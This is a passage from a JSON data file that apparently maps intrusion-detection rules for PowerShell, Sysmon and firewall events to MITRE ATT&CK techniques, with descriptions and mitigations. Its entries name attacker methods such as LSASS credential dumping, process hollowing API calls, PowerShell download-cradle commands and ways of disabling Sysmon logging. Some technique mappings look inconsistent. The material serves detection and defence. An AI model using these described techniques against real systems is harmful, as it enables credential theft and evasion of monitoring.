adversary may also use a service to escalate privileges. Adversaries may also directly start services through [Service Execution](\n\nTo make detection analysis more challenging, malicious services may also incorporate [Masquerade Task or Service]( (ex: using a service and/or payload name related to a legitimate OS or benign software component). Adversaries may also create \u2018hidden\u2019 services (i.e., [Hide Artifacts]( for example by using the `sc sdset` command to set service permissions via the Service Descriptor Definition Language (SDDL). This may hide a Windows service from the view of standard service enumeration methods such as `Get-Service`, `sc query`, and `services.exe`."
        ],
        "mitigation_strategies": [
            "Limit privileges of user accounts and groups so that only authorized administrators can interact with service changes and service configurations. "
        ]
    },
    {
        "rule_id": 92308,
        "rule_description": "Possible COM Hijacking evidence found in registry under $(win.eventdata.targetObject) binary is: $(win.eventdata.details)",
        "mitre_id": [
            "T1546.015"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 92309,
        "rule_description": "COM Hijacking evidence found in registry under $(win.eventdata.targetObject) suspicious binary is: $(win.eventdata.details)",
        "mitre_id": [
            "T1546.015"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 92400,
        "rule_description": "Possible code injection on explorer.exe by $(win.eventdata.sourceImage)",
        "mitre_id": [
            "T1055"
        ],
        "possible_attacks": [
            "Process Injection"
        ],
        "description": [
            "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \n\nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \n\nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. "
        ],
        "mitigation_strategies": [
            "Utilize Yama (ex: /proc/sys/kernel/yama/ptrace_scope) to mitigate ptrace based process injection by restricting the use of ptrace to privileged users only. Other mitigation controls involve the deployment of security kernel modules that provide advanced access control and process restrictions such as SELinux, grsecurity, and AppArmor."
        ]
    },
    {
        "rule_id": 92401,
        "rule_description": "Possible code injection on mstsc.exe (Windows RDP utility) by $(win.eventdata.sourceImage)",
        "mitre_id": [
            "T1055"
        ],
        "possible_attacks": [
            "Process Injection"
        ],
        "description": [
            "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \n\nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \n\nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. "
        ],
        "mitigation_strategies": [
            "Utilize Yama (ex: /proc/sys/kernel/yama/ptrace_scope) to mitigate ptrace based process injection by restricting the use of ptrace to privileged users only. Other mitigation controls involve the deployment of security kernel modules that provide advanced access control and process restrictions such as SELinux, grsecurity, and AppArmor."
        ]
    },
    {
        "rule_id": 92402,
        "rule_description": "Possible code injection by $(win.eventdata.sourceImage) on $(win.eventdata.targetImage)",
        "mitre_id": [
            "T1055.003",
            "T1055.012"
        ],
        "possible_attacks": [
            "Thread Execution Hijacking",
            "Process Hollowing"
        ],
        "description": [
            "Adversaries may inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. Thread Execution Hijacking is a method of executing arbitrary code in the address space of a separate live process. \n\nThread Execution Hijacking is commonly performed by suspending an existing process then unmapping/hollowing its memory, which can then be replaced with malicious code or the path to a DLL. A handle to an existing victim process is first created with native Windows API calls such as <code>OpenThread</code>. At this point the process can be suspended then written to, realigned to the injected code, and resumed via <code>SuspendThread </code>, <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>SetThreadContext</code>, then <code>ResumeThread</code> respectively.\n\nThis is very similar to [Process Hollowing]( but targets an existing process rather than creating a process in a suspended state.  \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via Thread Execution Hijacking may also evade detection from security products since the execution is masked under a legitimate process. ",
            "Adversaries may inject malicious code into suspended and hollowed processes in order to evade process-based defenses. Process hollowing is a method of executing arbitrary code in the address space of a separate live process.  \n\nProcess hollowing is commonly performed by creating a process in a suspended state then unmapping/hollowing its memory, which can then be replaced with malicious code. A victim process can be created with native Windows API calls such as <code>CreateProcess</code>, which includes a flag to suspend the processes primary thread. At this point the process can be unmapped using APIs calls such as <code>ZwUnmapViewOfSection</code> or <code>NtUnmapViewOfSection</code>  before being written to, realigned to the injected code, and resumed via <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>SetThreadContext</code>, then <code>ResumeThread</code> respectively.\n\nThis is very similar to [Thread Local Storage]( but creates a new process rather than targeting an existing process. This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process hollowing may also evade detection from security products since the execution is masked under a legitimate process. "
        ],
        "mitigation_strategies": [
            "Some endpoint security solutions can be configured to block some types of process injection based on common sequences of behavior that occur during the injection process. ",
            "Some endpoint security solutions can be configured to block some types of process injection based on common sequences of behavior that occur during the injection process. "
        ]
    },
    {
        "rule_id": 92403,
        "rule_description": "Local Security Authority Subsystem Service (LSASS) process was accessed by $(win.eventdata.sourceImage), possible code injection for credential dumping",
        "mitre_id": [
            "T1055"
        ],
        "possible_attacks": [
            "Process Injection"
        ],
        "description": [
            "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \n\nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \n\nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. "
        ],
        "mitigation_strategies": [
            "Utilize Yama (ex: /proc/sys/kernel/yama/ptrace_scope) to mitigate ptrace based process injection by restricting the use of ptrace to privileged users only. Other mitigation controls involve the deployment of security kernel modules that provide advanced access control and process restrictions such as SELinux, grsecurity, and AppArmor."
        ]
    },
    {
        "rule_id": 91510,
        "rule_description": "FTD: ARP collision detected.",
        "mitre_id": [
            "T1095"
        ],
        "possible_attacks": [
            "Non-Application Layer Protocol"
        ],
        "description": [
            "Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\n\nICMP communication between hosts is one example. Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts. However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications."
        ],
        "mitigation_strategies": [
            "Properly configure firewalls and proxies to limit outgoing traffic to only necessary ports and through proper network gateway systems. Also ensure hosts are only provisioned to communicate over authorized interfaces."
        ]
    },
    {
        "rule_id": 91518,
        "rule_description": "FTD: AAA (VPN) user locked out.",
        "mitre_id": [
            "T1133"
        ],
        "possible_attacks": [
            "External Remote Services"
        ],
        "description": [
            "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management]( and [VNC]( can also be used externally.\n\nAccess to [Valid Accounts]( to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network. Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard."
        ],
        "mitigation_strategies": [
            "Deny direct remote access to internal systems through the use of network proxies, gateways, and firewalls."
        ]
    },
    {
        "rule_id": 91522,
        "rule_description": "FTD: Firewall configuration changed.",
        "mitre_id": [
            "T1562.001"
        ],
        "possible_attacks": [
            "Disable or Modify Tools"
        ],
        "description": [
            "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking]( adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection. \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging. \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools. For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation]( which may lead to bypassing anti-tampering features."
        ],
        "mitigation_strategies": [
            "Ensure proper user permissions are in place to prevent adversaries from disabling or interfering with security services."
        ]
    },
    {
        "rule_id": 91525,
        "rule_description": "FTD: User created or modified on the Firewall.",
        "mitre_id": [
            "T1562.001"
        ],
        "possible_attacks": [
            "Disable or Modify Tools"
        ],
        "description": [
            "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking]( adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection. \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging. \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools. For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation]( which may lead to bypassing anti-tampering features."
        ],
        "mitigation_strategies": [
            "Ensure proper user permissions are in place to prevent adversaries from disabling or interfering with security services."
        ]
    },
    {
        "rule_id": 91803,
        "rule_description": "Screen capture method invoked from PowerShell script.",
        "mitre_id": [
            "T1113"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 91805,
        "rule_description": "Executed Powershell script \"Get-ADComputer\" executed.",
        "mitre_id": [
            "T1018"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 91806,
        "rule_description": "Powershell script \"Get-NetUser executed\".",
        "mitre_id": [
            "T1087.002"
        ],
        "possible_attacks": [
            "Domain Account"
        ],
        "description": [
            "Adversaries may attempt to get a listing of domain accounts. This information can help adversaries determine which domain accounts exist to aid in follow-on behavior such as targeting specific accounts which possess particular privileges.\n\nCommands such as <code>net user /domain</code> and <code>net group /domain</code> of the [Net]( utility, <code>dscacheutil -q group</code> on macOS, and <code>ldapsearch</code> on Linux can list domain users and groups. [PowerShell]( cmdlets including <code>Get-ADUser</code> and <code>Get-ADGroupMember</code> may enumerate members of Active Directory groups.  "
        ],
        "mitigation_strategies": [
            "Prevent administrator accounts from being enumerated when an application is elevating through UAC since it can lead to the disclosure of account names. The Registry key is located at <code>HKLM\\ SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\CredUI\\EnumerateAdministrators</code>. It can be disabled through GPO: Computer Configuration > [Policies] > Administrative Templates > Windows Components > Credential User Interface: Enumerate administrator accounts on elevation."
        ]
    },
    {
        "rule_id": 91808,
        "rule_description": "Powershell script queried registry value",
        "mitre_id": [
            "T1012"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 91809,
        "rule_description": "Powershell script may be using Base64 decoding method",
        "mitre_id": [
            "T1140"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 91810,
        "rule_description": "Powershell script may be executing suspicious code with CreateThread API",
        "mitre_id": [
            "T1106"
        ],
        "possible_attacks": [
            "Native API"
        ],
        "description": [
            "Adversaries may interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes. These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.\n\nAdversaries may abuse these OS API functions as a means of executing behaviors. Similar to [Command and Scripting Interpreter]( the native API and its hierarchy of interfaces provide mechanisms to interact with and utilize various components of a victimized system.\n\nNative API functions (such as <code>NtCreateProcess</code>) may be directed invoked via system calls / syscalls, but these features are also often exposed to user-mode applications via interfaces and libraries. For example, functions such as the Windows API <code>CreateProcess()</code> or GNU <code>fork()</code> will allow programs and scripts to start other processes. This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.\n\nHigher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.\n\nAdversaries may use assembly to directly or in-directly invoke syscalls in an attempt to subvert defensive sensors and detection signatures such as user mode API-hooks. Adversaries may also attempt to tamper with sensors and defensive tools associated with API monitoring, such as unhooking monitored functions via [Disable or Modify Tools]("
        ],
        "mitigation_strategies": [
            "Identify and block potentially malicious software executed that may be executed through this technique by using application control  tools, like Windows Defender Application Control, AppLocker,   or Software Restriction Policies  where appropriate. "
        ]
    },
    {
        "rule_id": 91811,
        "rule_description": "Powershell script executed \"Expand-Archive\"",
        "mitre_id": [
            "T1105"
        ],
        "possible_attacks": [
            "Ingress Tool Transfer"
        ],
        "description": [
            "Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as [ftp]( Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. [Lateral Tool Transfer]( \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, [certutil]( and [PowerShell]( commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by [User Execution]( (typically after interacting with [Phishing]( lures).\n\nFiles can also be transferred using various [Web Service]( as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine."
        ],
        "mitigation_strategies": [
            "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools."
        ]
    },
    {
        "rule_id": 91812,
        "rule_description": "Powershell script executed an object deletion",
        "mitre_id": [
            "T1112"
        ],
        "possible_attacks": [
            "Modify Registry"
        ],
        "description": [
            "Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.\n\nAccess to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility [Reg]( may be used for local or remote Registry modification.  Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.\n\nRegistry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via [Reg]( or other utilities using the Win32 API.  Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.  \n\nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system.  Often [Valid Accounts]( are required, along with access to the remote system's [SMB/Windows Admin Shares]( for RPC communication."
        ],
        "mitigation_strategies": [
            "Ensure proper permissions are set for Registry hives to prevent users from modifying keys for system components that may lead to privilege escalation."
        ]
    },
    {
        "rule_id": 91813,
        "rule_description": "Powershell script deleted a registry key from an object",
        "mitre_id": [
            "T1112"
        ],
        "possible_attacks": [
            "Modify Registry"
        ],
        "description": [
            "Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.\n\nAccess to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility [Reg]( may be used for local or remote Registry modification.  Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.\n\nRegistry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via [Reg]( or other utilities using the Win32 API.  Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.  \n\nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system.  Often [Valid Accounts]( are required, along with access to the remote system's [SMB/Windows Admin Shares]( for RPC communication."
        ],
        "mitigation_strategies": [
            "Ensure proper permissions are set for Registry hives to prevent users from modifying keys for system components that may lead to privilege escalation."
        ]
    },
    {
        "rule_id": 91814,
        "rule_description": "Powershell script deleted an auto start entry registry key",
        "mitre_id": [
            "T1112"
        ],
        "possible_attacks": [
            "Modify Registry"
        ],
        "description": [
            "Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.\n\nAccess to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility [Reg]( may be used for local or remote Registry modification.  Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.\n\nRegistry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via [Reg]( or other utilities using the Win32 API.  Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.  \n\nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system.  Often [Valid Accounts]( are required, along with access to the remote system's [SMB/Windows Admin Shares]( for RPC communication."
        ],
        "mitigation_strategies": [
            "Ensure proper permissions are set for Registry hives to prevent users from modifying keys for system components that may lead to privilege escalation."
        ]
    },
    {
        "rule_id": 91815,
        "rule_description": "Powershell executing process discovery",
        "mitre_id": [
            "T1057"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 91816,
        "rule_description": "Powershell script querying system environment variables",
        "mitre_id": [
            "T1082"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 91817,
        "rule_description": "Powershell script executed \"ConvertSidToStringSid\" API. Possible domain SID enumeration",
        "mitre_id": [
            "T1033",
            "T1082"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 91818,
        "rule_description": "Powershell script executed \"New-Service\" command",
        "mitre_id": [
            "T1543.003"
        ],
        "possible_attacks": [
            "Windows Service"
        ],
        "description": [
            "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions. Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\n\nAdversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. \n\nAdversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: `.sys`) to disk, the payload can be loaded and registered via [Native API]( functions such as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()` and `ZwSetValueKey()`), by creating the required service Registry values (i.e. [Modify Registry]( or by using command-line utilities such as `PnPUtil.exe`. Adversaries may leverage these drivers as [Rootkit]( to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of [Exploitation for Privilege Escalation](\n\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through [Service Execution](\n\nTo make detection analysis more challenging, malicious services may also incorporate [Masquerade Task or Service]( (ex: using a service and/or payload name related to a legitimate OS or benign software component). Adversaries may also create \u2018hidden\u2019 services (i.e., [Hide Artifacts]( for example by using the `sc sdset` command to set service permissions via the Service Descriptor Definition Language (SDDL). This may hide a Windows service from the view of standard service enumeration methods such as `Get-Service`, `sc query`, and `services.exe`."
        ],
        "mitigation_strategies": [
            "Limit privileges of user accounts and groups so that only authorized administrators can interact with service changes and service configurations. "
        ]
    },
    {
        "rule_id": 91819,
        "rule_description": "Powershell script searching filesystem",
        "mitre_id": [
            "T1083"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 91820,
        "rule_description": "Powershell script recursively collected files from a filesystem search",
        "mitre_id": [
            "T1083",
            "T1119"
        ],
        "possible_attacks": [
            "Automated Collection"
        ],
        "description": [
            "Once established within a system or network, an adversary may use automated techniques for collecting internal data. Methods for performing this technique could include use of a [Command and Scripting Interpreter]( to search for and copy information fitting set criteria such as file type, location, or name at specific time intervals. \n\nIn cloud-based environments, adversaries may also use cloud APIs, data pipelines, command line interfaces, or extract, transform, and load (ETL) services to automatically collect data. \n\nThis functionality could also be built into remote access tools. \n\nThis technique may incorporate use of other techniques such as [File and Directory Discovery]( and [Lateral Tool Transfer]( to identify and move files, as well as [Cloud Service Dashboard]( and [Cloud Storage Object Discovery]( to identify resources in cloud environments."
        ],
        "mitigation_strategies": [
            "Encryption and off-system storage of sensitive information may be one way to mitigate collection of files, but may not stop an adversary from acquiring the information if an intrusion persists over a long period of time and the adversary is able to discover and access the data through other means."
        ]
    },
    {
        "rule_id": 91821,
        "rule_description": "Powershell script created a compressed file from results of filesystem search",
        "mitre_id": [
            "T1083",
            "T1074.001"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 91822,
        "rule_description": "Powershell script used \"Invoke-command\" cmdlet to execute sub script",
        "mitre_id": [
            "T1059.001"
        ],
        "possible_attacks": [
            "PowerShell"
        ],
        "description": [
            "Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nA number of PowerShell-based offensive testing tools are available, including [Empire](  [PowerSploit]( [PoshC2]( and PSAttack.\n\nPowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI)."
        ],
        "mitigation_strategies": [
            "When PowerShell is necessary, consider restricting PowerShell execution policy to administrators. Be aware that there are methods of bypassing the PowerShell execution policy, depending on environment configuration.\n\nPowerShell JEA (Just Enough Administration) may also be used to sandbox administration and limit what commands admins/users can execute through remote PowerShell sessions."
        ]
    },
    {
        "rule_id": 91823,
        "rule_description": "Powershell script used \"Invoke-command\" cmdlet to execute code on remote computer",
        "mitre_id": [
            "T1059.001",
            "T1021.006"
        ],
        "possible_attacks": [
            "PowerShell",
            "Windows Remote Management"
        ],
        "description": [
            "Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nA number of PowerShell-based offensive testing tools are available, including [Empire](  [PowerSploit]( [PoshC2]( and PSAttack.\n\nPowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).",
            "Adversaries may use [Valid Accounts]( to interact with remote systems using Windows Remote Management (WinRM). The adversary may then perform actions as the logged-on user.\n\nWinRM is the name of both a Windows service and a protocol that allows a user to interact with a remote system (e.g., run an executable, modify the Registry, modify services). It may be called with the `winrm` command or by any number of programs such as PowerShell. WinRM  can be used as a method of remotely interacting with [Windows Management Instrumentation]("
        ],
        "mitigation_strategies": [
            "When PowerShell is necessary, consider restricting PowerShell execution policy to administrators. Be aware that there are methods of bypassing the PowerShell execution policy, depending on environment configuration.\n\nPowerShell JEA (Just Enough Administration) may also be used to sandbox administration and limit what commands admins/users can execute through remote PowerShell sessions.",
            "If the service is necessary, lock down critical enclaves with separate WinRM accounts and permissions."
        ]
    },
    {
        "rule_id": 91824,
        "rule_description": "Powershell collected clipboard data",
        "mitre_id": [
            "T1115"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 91825,
        "rule_description": "Powershell executed file compression",
        "mitre_id": [
            "T1560.001"
        ],
        "possible_attacks": [
            "Archive via Utility"
        ],
        "description": [
            "Adversaries may use utilities to compress and/or encrypt collected data prior to exfiltration. Many utilities include functionalities to compress, encrypt, or otherwise package data into a format that is easier/more secure to transport.\n\nAdversaries may abuse various utilities to compress or encrypt data before exfiltration. Some third party utilities may be preinstalled, such as <code>tar</code> on Linux and macOS or <code>zip</code> on Windows systems. \n\nOn Windows, <code>diantz</code> or <code> makecab</code> may be used to package collected files into a cabinet (.cab) file. <code>diantz</code> may also be used to download and compress files from remote locations (i.e. [Remote Data Staging]( <code>xcopy</code> on Windows can copy files and directories with a variety of options. Additionally, adversaries may use [certutil]( to Base64 encode collected data before exfiltration. \n\nAdversaries may use also third party utilities, such as 7-Zip, WinRAR, and WinZip, to perform similar activities."
        ],
        "mitigation_strategies": [
            "System scans can be performed to identify unauthorized archival utilities."
        ]
    },
    {
        "rule_id": 91826,
        "rule_description": "Powershell executed \"Copy-Item\"",
        "mitre_id": [
            "T1560"
        ],
        "possible_attacks": [
            "Archive Collected Data"
        ],
        "description": [
            "An adversary may compress and/or encrypt data that is collected prior to exfiltration. Compressing the data can help to obfuscate the collected data and minimize the amount of data sent over the network. Encryption can be used to hide information that is being exfiltrated from detection or make exfiltration less conspicuous upon inspection by a defender.\n\nBoth compression and encryption are done prior to exfiltration, and can be performed using a utility, 3rd party library, or custom method."
        ],
        "mitigation_strategies": [
            "System scans can be performed to identify unauthorized archival utilities."
        ]
    },
    {
        "rule_id": 91827,
        "rule_description": "Powershell executed \"Set-WmiInstance\". Possible creation or update of a WMI instance",
        "mitre_id": [
            "T1560"
        ],
        "possible_attacks": [
            "Archive Collected Data"
        ],
        "description": [
            "An adversary may compress and/or encrypt data that is collected prior to exfiltration. Compressing the data can help to obfuscate the collected data and minimize the amount of data sent over the network. Encryption can be used to hide information that is being exfiltrated from detection or make exfiltration less conspicuous upon inspection by a defender.\n\nBoth compression and encryption are done prior to exfiltration, and can be performed using a utility, 3rd party library, or custom method."
        ],
        "mitigation_strategies": [
            "System scans can be performed to identify unauthorized archival utilities."
        ]
    },
    {
        "rule_id": 91828,
        "rule_description": "Powershell executed a creation or update of a WMI instance with encoded values",
        "mitre_id": [
            "T1027"
        ],
        "possible_attacks": [
            "Obfuscated Files or Information"
        ],
        "description": [
